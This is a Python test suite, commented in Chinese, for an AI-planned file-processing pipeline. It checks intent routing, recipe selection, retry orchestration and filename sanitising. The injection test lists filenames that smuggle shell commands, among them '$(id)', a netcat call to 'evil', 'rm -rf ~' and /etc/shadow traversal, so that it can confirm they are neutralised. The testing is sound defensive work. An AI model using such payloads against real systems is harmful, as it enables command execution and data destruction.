#!/usr/bin/env python3
"""
文件处理流水线测试 (tests/test_file_pipeline.py)

全部离线：意图判定只走关键词短路分支，规划循环用桩替换 call_agy，
执行层用真实 ImageMagick（属于 TOOLCHAIN 声明的必备依赖）。
"""

import os
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import file_pipeline as fp
from tests.harness import main


def _has(binary):
    return shutil.which(binary) is not None


def _make_image(path, size="300x200", gradient="blue-red"):
    tool = "magick" if _has("magick") else "convert"
    subprocess.run(
        [tool, "-size", size, f"gradient:{gradient}", path],
        capture_output=True, timeout=30,
    )
    return os.path.exists(path)


def test_filename_injection(s):
    """文件名会进入 shell=True 执行的命令，必须先中和元字符。

    真实攻击面：用户转发一个来自频道的恶意命名文件即可触发任意命令执行，
    无需任何主动的危险操作。os.path.basename() 只挡路径穿越，不挡元字符。
    """
    s.section("shell 元字符必须被中和")
    payloads = [
        "report;touch PWNED;.pdf",
        "a$(id).jpg",
        "`whoami`.png",
        "x|nc evil 1234.mp4",
        "a && rm -rf ~.txt",
        "n\newline.jpg",
        "quote'\"quote.png",
        "glob*?[].jpg",
        "$HOME.txt",
        "tab\there.pdf",
    ]
    dangerous = set(";|&$`()<>*?[]{}!\\'\" \n\t\r")
    for raw in payloads:
        got = fp.safe_filename(raw)
        leaked = sorted(set(got) & dangerous)
        s.check(f"{raw!r} 无残留元字符", leaked, [])

    s.section("路径穿越")
    s.check("../../etc/passwd", fp.safe_filename("../../etc/passwd"), "passwd")
    s.check("绝对路径", fp.safe_filename("/etc/shadow"), "shadow")

    s.section("可用性：正常文件名不被破坏")
    s.check("中文保留", fp.safe_filename("季度报告.pdf"), "季度报告.pdf")
    s.check("常规英文", fp.safe_filename("report_v2-final.docx"), "report_v2-final.docx")
    s.truthy("空名有兜底", fp.safe_filename("") == "file")
    s.truthy("纯符号有兜底", fp.safe_filename("***") == "file")
    s.truthy("扩展名保留", fp.safe_filename("x;y.mp4").endswith(".mp4"))

    s.section("端到端：注入载荷经收敛后不再触发")
    if not (_has("convert") or _has("magick")):
        return
    work = tempfile.mkdtemp()
    try:
        safe = fp.safe_filename("report;touch PWNED_MARKER;.jpg")
        path = os.path.join(work, safe)
        _make_image(path)
        marker = os.path.join(work, "PWNED_MARKER")
        tool = "magick" if _has("magick") else "convert"
        fp.execute_commands([f"{tool} {path} -quality 40 {work}/out.jpg"], work)
        s.check("未产生注入痕迹", os.path.exists(marker), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_intent_shortcircuit(s):
    s.section("意图判定：关键词短路（零模型调用）")
    cases = [
        ("帮我压缩一下", ["a.jpg"], True),
        ("让这张图小一点", ["a.jpg"], True),
        ("拼成长图", ["a.jpg", "b.jpg"], True),
        ("转成gif", ["v.mp4"], True),
        ("提取音频", ["v.mp4"], True),
        ("这是什么", ["a.jpg"], False),
        ("帮我看看这个报错", ["a.png"], False),
        ("提取文字", ["a.png"], False),
        ("解释一下这段代码", ["a.png"], False),
        # 无附言必须走问答：物理处理是破坏性的，不能当默认
        ("", ["a.pdf"], False),
        (None, ["doc.pdf"], False),
    ]
    for caption, names, want in cases:
        got, how = fp.classify_intent(caption, names, "gemini-3.6-flash-high")
        s.check(f"{caption!r} → {how}", got, want)
        # 关键词/空附言分支绝不能触发模型调用
        s.check(f"{caption!r} 未调用模型", how in ("keyword", "empty"), True)


def test_recipe_selection(s):
    s.section("菜谱命中")
    s.check("拼接意图", [n for n, _ in fp.select_recipes(["a.jpg", "b.jpg"], "拼成长图")][:1],
            ["image_stitching.md"])
    s.check("压缩意图", [n for n, _ in fp.select_recipes(["a.png"], "压缩一下")][:1],
            ["image_compression.md"])
    s.check("转GIF意图", [n for n, _ in fp.select_recipes(["v.mp4"], "转gif")][:1],
            ["video_to_gif.md"])
    s.check("无命中", fp.select_recipes(["x.txt"], "随便弄弄"), [])

    s.section("菜谱与索引一致性")
    for entry in fp.RECIPE_INDEX:
        path = os.path.join(fp.RECIPE_DIR, entry["file"])
        s.check(f"{entry['file']} 存在", os.path.exists(path), True)
    for fname in sorted(os.listdir(fp.RECIPE_DIR)):
        if not fname.endswith(".md") or fname == "README.md":
            continue
        registered = any(e["file"] == fname for e in fp.RECIPE_INDEX)
        # 未注册的菜谱永远不会被命中，等于白写
        s.check(f"{fname} 已注册进 RECIPE_INDEX", registered, True)

    s.section("菜谱不得含执行环境不存在的占位写法")
    for fname in sorted(os.listdir(fp.RECIPE_DIR)):
        if not fname.endswith(".md") or fname == "README.md":
            continue
        with open(os.path.join(fp.RECIPE_DIR, fname), encoding="utf-8") as fh:
            body = fh.read()
        s.check(f"{fname} 无 $OUTPUT/$INPUT 变量", "$OUTPUT" in body or "$INPUT" in body, False)


def test_pdf_recipe_routing(s):
    """PDF 的两类需求必须各自命中正确的菜谱，且不夹带无关手册。"""
    s.section("压缩 vs 按页转图 的排序")
    cases = [
        ("压缩一下", "pdf_compression.md"),
        ("太大了帮我压压", "pdf_compression.md"),
        ("邮件附件太大", "pdf_compression.md"),
        ("按页转成图片", "pdf_to_images.md"),
        ("每页导出一张jpg", "pdf_to_images.md"),
        ("拆成图片", "pdf_to_images.md"),
        ("转png", "pdf_to_images.md"),
    ]
    for caption, expected in cases:
        picked = [n for n, _ in fp.select_recipes(["report.pdf"], caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, expected)
        # 两份 PDF 手册都提供是合理的（意图接近时让 Planner 自行取舍），
        # 但绝不能混入图片/视频类手册
        s.check(f"{caption!r} 无跨类型噪声",
                [n for n in picked if not n.startswith("pdf_")], [])

    s.section("扩展名不匹配的菜谱一律不入选")
    for names, forbidden in (
        (["report.pdf"], "image_compression.md"),
        (["photo.jpg"], "pdf_compression.md"),
        (["clip.mp4"], "pdf_to_images.md"),
    ):
        picked = [n for n, _ in fp.select_recipes(names, "压缩一下")]
        s.check(f"{names[0]} 不含 {forbidden}", forbidden in picked, False)

    s.section("PDF 相关措辞走关键词短路，不烧模型调用")
    for caption in ("压缩一下", "太大了帮我压压", "按页转成图片",
                    "每页导出一张jpg", "转png", "拆成图片"):
        _, how = fp.classify_intent(caption, ["report.pdf"], "m")
        s.check(f"{caption!r} 判定方式", how, "keyword")


def test_image_to_pdf_routing(s):
    """图片转 PDF 与图片拼接必须区分开 —— 两者都能"合并多张图"，但产物完全不同。"""
    imgs = ["photo_01.jpg", "photo_02.jpg"]

    s.section("转 PDF 的措辞命中 images_to_pdf")
    for caption in ("转成pdf", "做成pdf", "合并成pdf", "打包成pdf", "生成pdf"):
        picked = [n for n, _ in fp.select_recipes(imgs, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "images_to_pdf.md")

    s.section("拼接的措辞仍命中 image_stitching")
    for caption in ("拼成长图", "上下拼接", "合并成一张", "左右拼接"):
        picked = [n for n, _ in fp.select_recipes(imgs, caption)]
        s.check(f"{caption!r} 首选", picked[0] if picked else None, "image_stitching.md")

    s.section("最长关键词优先")
    # 「合并成pdf」同时匹配 image_stitching 的「合并成」与本份的「合并成pdf」，
    # 必须由更长、更具体的那个胜出
    picked = [n for n, _ in fp.select_recipes(imgs, "合并成pdf")]
    s.check("更具体的关键词胜出", picked[0], "images_to_pdf.md")

    s.section("意图判定走关键词短路")
    for caption in ("转成pdf", "合并成pdf", "做成pdf", "打包成pdf"):
        _, how = fp.classify_intent(caption, imgs, "m")
        s.check(f"{caption!r} 判定方式", how, "keyword")


def test_recipe_selection_precision(s):
    """明确意图时不应再塞入靠扩展名兜底的手册 —— 那是 prompt 噪声。"""
    s.section("有关键词命中时只给命中的手册")
    for names, caption, expected in (
        (["a.jpg"], "压缩一下", ["image_compression.md"]),
        (["a.jpg"], "转成pdf", ["images_to_pdf.md"]),
        (["r.pdf"], "压缩一下", ["pdf_compression.md"]),
        (["r.pdf"], "按页转成图片", ["pdf_to_images.md"]),
        (["v.mp4"], "转gif", ["video_to_gif.md"]),
    ):
        s.check(f"{names[0]} {caption!r}",
                [n for n, _ in fp.select_recipes(names, caption)], expected)

    s.section("无关键词命中时才用扩展名兜底")
    picked = [n for n, _ in fp.select_recipes(["a.jpg"], "随便弄弄")]
    s.truthy("给出候选手册", len(picked) > 0)
    s.check("兜底候选均为图片类", [n for n in picked if not n.startswith("image")], [])


def test_product_packaging(s):
    """产物过多时自动打包 —— PDF 按页转图动辄几十张，逐个发送会刷屏。"""
    s.section("阈值行为")
    work = tempfile.mkdtemp()
    try:
        def make(n):
            for f in os.listdir(work):
                os.remove(os.path.join(work, f))
            paths = []
            for i in range(n):
                path = os.path.join(work, f"page-{i:02d}.jpg")
                with open(path, "w") as fh:
                    fh.write("x" * 200)
                paths.append(path)
            return paths

        out, packed = fp.package_products(make(fp.MAX_INLINE_PRODUCTS), work, "doc.pdf")
        s.check(f"{fp.MAX_INLINE_PRODUCTS} 个（等于阈值）不打包", packed, False)
        s.check("原样返回全部产物", len(out), fp.MAX_INLINE_PRODUCTS)

        out, packed = fp.package_products(make(fp.MAX_INLINE_PRODUCTS + 1), work, "doc.pdf")
        s.check("超过阈值则打包", packed, True)
        s.check("只投递 1 个压缩包", len(out), 1)
        s.truthy("产物是 zip", out[0].endswith(".zip"))

        import zipfile
        with zipfile.ZipFile(out[0]) as zf:
            s.check("压缩包内含全部页面", len(zf.namelist()), fp.MAX_INLINE_PRODUCTS + 1)
        s.check("散件已清理",
                [f for f in os.listdir(work) if f.endswith(".jpg")], [])

        s.section("压缩包命名沿用输入名且经过安全收敛")
        out, _ = fp.package_products(make(20), work, "report;rm -rf .pdf")
        s.check("包名无 shell 元字符",
                sorted(set(os.path.basename(out[0])) & set(";|&$`() ")), [])
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_toolchain_trim(s):
    s.section("工具链裁剪")
    tc = fp.load_toolchain()
    s.truthy("含 FFmpeg", "FFmpeg" in tc)
    s.truthy("含 pngquant", "pngquant" in tc)
    s.check("已剔除 PostgreSQL 噪声", "PostgreSQL" in tc, False)
    s.check("已剔除 qBittorrent 噪声", "qBittorrent" in tc, False)


def test_command_extraction(s):
    s.section("命令提取容错")
    s.check("<json> 标签", fp._extract_commands('废话<json>["echo a","echo b"]</json>尾巴'),
            ["echo a", "echo b"])
    s.check("```json 代码块", fp._extract_commands('```json\n["echo x"]\n```'), ["echo x"])
    s.check("裸数组", fp._extract_commands('这是计划: ["echo y"] 完毕'), ["echo y"])
    s.check("纯散文无命令", fp._extract_commands("我觉得这张图很好看"), None)
    s.check("空数组视为无效", fp._extract_commands("<json>[]</json>"), None)


def test_execution_layer(s):
    if not (_has("convert") or _has("magick")):
        s.section("执行层（跳过：未安装 ImageMagick）")
        return

    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)

        s.section("执行层：捕获真实 stderr")
        s.truthy("测试素材生成", _make_image(f"{win}/src.jpg"))
        tool = "magick" if _has("magick") else "convert"
        ok, failure = fp.execute_commands([f"{tool} {win}/src.jpg -quality 40 {wout}/out.jpg"], win)
        s.check("正常压缩成功", ok, True)
        s.check("产物存在", os.path.exists(f"{wout}/out.jpg"), True)

        ok, failure = fp.execute_commands([f"{tool} /nonexistent/nope.jpg out.jpg"], win)
        s.check("失败被捕获", ok, False)
        s.truthy("拿到真实 stderr 而非返回码", "nope.jpg" in failure["stderr"])

        s.section("产物兜底回收（模型写相对路径的经典翻车）")
        win2, wout2 = os.path.join(work, "in2"), os.path.join(work, "out2")
        os.makedirs(win2)
        os.makedirs(wout2)
        _make_image(f"{win2}/src.png", gradient="green-black")
        original = set(os.listdir(win2))
        ok, _ = fp.execute_commands([f"{tool} src.png -quality 40 stitched_result.jpg"], win2)
        s.check("相对路径命令执行成功", ok, True)
        s.check("产物确实落错目录", os.path.exists(f"{win2}/stitched_result.jpg"), True)
        products = fp.collect_outputs(win2, wout2, original)
        s.check("兜底回收到 1 个产物", len(products), 1)
        s.check("已搬进输出目录",
                os.path.basename(products[0]) if products else None, "stitched_result.jpg")

        s.section("元数据探针")
        s.truthy("图片含尺寸", "300x200" in fp.probe_file(f"{win}/src.jpg"))
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_oversized_product_feedback(s):
    """产物过大时把**实际体积**回喂给 Planner 重做，而不是直接投递。

    GIF 体积与内容强相关（同参数实测相差 21 倍），预设宽度必然要么过大
    要么过度降质；量出来再调才可靠。
    """
    if not (_has("convert") or _has("magick")):
        s.section("体积回喂（跳过：未安装 ImageMagick）")
        return

    tool = "magick" if _has("magick") else "convert"
    work = tempfile.mkdtemp()
    original_call = fp.call_agy
    original_limit = fp.MAX_PRODUCT_BYTES
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        _make_image(f"{win}/src.png", size="900x900")

        s.section("超限 → 回喂实际体积并重做")
        # 900x900 渐变 PNG 约 10 KB；把上限压到 5 KB 使首轮必然超限
        fp.MAX_PRODUCT_BYTES = 5_000
        prompts = []

        def stub(prompt, model, timeout):
            prompts.append(prompt)
            width = 900 if len(prompts) == 1 else 60
            return True, (f'<json>["{tool} {win}/src.png -resize {width}x '
                          f'{wout}/out.png"]</json>'), None

        fp.call_agy = stub
        steps = []
        ok, products, _ = fp.plan_and_execute(
            [f"{win}/src.png"], win, wout, "缩放", "m", steps.append)

        s.check("触发了第二轮规划", len(prompts), 2)
        s.truthy("重规划 prompt 含实际体积", "体积过大" in prompts[1])
        s.truthy("重规划 prompt 提示降宽度", "宽度" in prompts[1])
        s.truthy("状态播报提示产物偏大", any("偏大" in x for x in steps))
        # 产物偏大不是"报错"，播报措辞不得混淆两者
        s.check("未把体积超限误报为执行报错",
                [x for x in steps if "执行报错" in x], [])
        s.check("最终成功", ok, True)
        s.check("产出 1 个文件", len(products), 1)
        s.truthy("最终产物在限额内",
                 os.path.getsize(products[0]) <= fp.MAX_PRODUCT_BYTES)

        s.section("未超限 → 直接投递，不额外规划")
        fp.MAX_PRODUCT_BYTES = original_limit
        prompts.clear()
        for f in os.listdir(wout):
            os.remove(os.path.join(wout, f))
        fp.call_agy = lambda p, m, t: (
            True, f'<json>["{tool} {win}/src.png -resize 50x {wout}/small.png"]</json>', None)
        ok, products, _ = fp.plan_and_execute(
            [f"{win}/src.png"], win, wout, "缩放", "m")
        s.check("只规划一次", len(prompts), 0)
        s.check("成功", ok, True)
    finally:
        fp.call_agy = original_call
        fp.MAX_PRODUCT_BYTES = original_limit
        shutil.rmtree(work, ignore_errors=True)


def test_plan_prompt(s):
    s.section("Planner prompt 组装")
    prompt = fp.build_plan_prompt(["/abs/in/src.jpg"], "/abs/out", "压缩一下")
    s.truthy("内联了菜谱正文", "pngquant --quality" in prompt)
    s.truthy("含绝对输入路径", "/abs/in/src.jpg" in prompt)
    s.truthy("含输出目录", "/abs/out" in prompt)
    s.truthy("含占位符替换警告", "$OUTPUT_DIR" in prompt)
    s.truthy("带内部会话标记", fp.INTERNAL_MARKER in prompt)

    repair = fp.build_plan_prompt(["/abs/in/src.jpg"], "/abs/out", "压缩一下",
                                  {"cmd": "convert bad", "stderr": "boom"})
    s.truthy("重规划带错误回喂", "boom" in repair and "执行失败" in repair)


def test_orchestration(s):
    if not (_has("convert") or _has("magick")):
        s.section("编排循环（跳过：未安装 ImageMagick）")
        return

    tool = "magick" if _has("magick") else "convert"
    work = tempfile.mkdtemp()
    original_call_agy = fp.call_agy
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        _make_image(f"{win}/01_a.jpg")
        _make_image(f"{win}/02_b.jpg", gradient="green-black")

        s.section("失败 → 回喂真实 stderr → 重规划 → 成功")
        calls = []

        def stub(prompt, model, timeout):
            calls.append(prompt)
            if len(calls) == 1:
                return True, f'<json>["{tool} /nope/x.jpg {wout}/o.jpg"]</json>', None
            s.truthy("重规划 prompt 含回喂段落", "上一轮规划执行失败" in prompt)
            s.truthy("重规划 prompt 含真实 stderr", "nope" in prompt)
            return True, (f'<json>["{tool} {win}/01_a.jpg {win}/02_b.jpg '
                          f'-resize 300x -append {wout}/stitched.jpg"]</json>'), None

        fp.call_agy = stub
        steps = []
        ok, products, err = fp.plan_and_execute(
            [f"{win}/01_a.jpg", f"{win}/02_b.jpg"], win, wout, "拼成长图", "m", steps.append)
        s.check("规划轮数", len(calls), 2)
        s.check("最终成功", ok, True)
        s.check("产出 1 个文件", len(products), 1)
        s.truthy("状态播报含重规划提示", any("重新规划" in x for x in steps))

        s.section("彻底失败时用户可见真实错因")
        fp.call_agy = lambda p, m, t: (True, f'<json>["{tool} /nope/x.jpg {wout}/o.jpg"]</json>', None)
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.check("失败", ok, False)
        s.truthy("错误含真实 stderr", "nope" in err)
        s.check("HTML 已转义", "<pre>" in err and "&lt;" not in err.split("<pre>")[0], True)

        s.section("认证失效不得伪装成格式错误")
        fp.call_agy = lambda p, m, t: (False, "", "auth")
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.check("失败", ok, False)
        s.truthy("提示认证问题", "认证" in err)

        s.section("规划超时归因正确")
        fp.call_agy = lambda p, m, t: (False, "", "timeout")
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.truthy("提示超时", "超时" in err)
    finally:
        fp.call_agy = original_call_agy
        shutil.rmtree(work, ignore_errors=True)


SUITES = [
    ("文件名注入防护", test_filename_injection),
    ("意图判定", test_intent_shortcircuit),
    ("菜谱选取", test_recipe_selection),
    ("PDF 菜谱路由", test_pdf_recipe_routing),
    ("图片转PDF路由", test_image_to_pdf_routing),
    ("菜谱选取精度", test_recipe_selection_precision),
    ("产物打包", test_product_packaging),
    ("工具链裁剪", test_toolchain_trim),
    ("命令提取", test_command_extraction),
    ("执行层", test_execution_layer),
    ("产物体积回喂", test_oversized_product_feedback),
    ("Prompt 组装", test_plan_prompt),
    ("编排循环", test_orchestration),
]

if __name__ == "__main__":
    main(SUITES)
